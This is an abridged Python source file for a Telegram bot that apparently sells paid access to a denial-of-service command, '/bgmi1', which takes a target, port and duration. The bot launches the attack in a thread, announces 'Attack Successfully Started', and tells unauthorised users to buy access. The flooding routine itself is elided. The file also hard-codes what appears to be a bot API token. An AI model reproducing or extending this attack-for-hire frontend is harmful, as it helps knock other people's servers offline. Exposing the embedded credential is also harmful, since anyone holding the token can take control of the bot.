...
bot = telebot.TeleBot('8591249995:AAHslvmdYsVOgdnmljukWT-yX6syvauJzm0')
...
def run_attack_and_notify(message, user_id, target, port, time):
    ...
    if success:
        ...
        button = InlineKeyboardButton("🫧 ᴍᴜsᴛ ᴄʜᴇᴄᴋᴏᴜᴛ ᴛʜɪs 🫧", url="https://t.me/M4_Music_Bot?startgroup=s&admin=delete_messages+manage_video_chats+pin_messages+invite_users")
        markup.add(button)
        bot.send_message(message.chat.id, "sʜᴀʀᴇ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ ᴏғ ᴇᴠᴇʀʏ ᴀᴛᴛᴀᴄᴋ ɪs ᴄᴏᴍᴘᴜʟsᴏʀʏ", reply_markup=markup)
    ...
    if user_id in allowed_user_ids or user_id in admin_id:
        ...
        if len(command) == 4:
            ...
            if time > 180:
                ...
                attack_start_message = f"{username}, 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐭𝐚𝐫𝐭𝐞𝐝 😁♥️\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: @M4_Music_Bot"
                bot.reply_to(message, attack_start_message)
                threading.Thread(target=run_attack_and_notify, args=(message, user_id, target, port, time)).start()
        else:
            response = "✅ Usage :- /bgmi1 <target> <port> <time>"
    else:
        response = "🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi1 command. DM TO BUY ACCESS:- @M4_Music_Bot"
    bot.reply_to(message, response)
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Contact @M4_Music_Bot for plan details.'''
    bot.reply_to(message, response)
